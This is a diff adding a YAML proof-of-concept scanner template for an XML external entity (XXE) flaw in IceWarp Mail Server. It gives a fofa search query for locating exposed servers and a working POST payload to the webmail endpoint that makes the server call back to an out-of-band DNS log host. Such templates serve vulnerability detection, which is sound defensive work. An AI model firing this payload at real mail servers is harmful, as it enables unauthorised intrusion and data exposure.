@@ -1,0 +1,22 @@
+id: poc-yaml-icewarp-mail-server-xxe
+info:
+  name: 爱思华宝邮件服务器XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 爱思华宝邮件服务器
+  fofa: body="Powered by IceWarp Software"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /webmail/server/webmail.php
+  headers:
+    Content-Type: application/xml
+  data: <?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "http://{{.reverseDomain}}/">]><a>&content;</a>
+  expression: 'reverse.Verify()
+
+    '
+transport: http
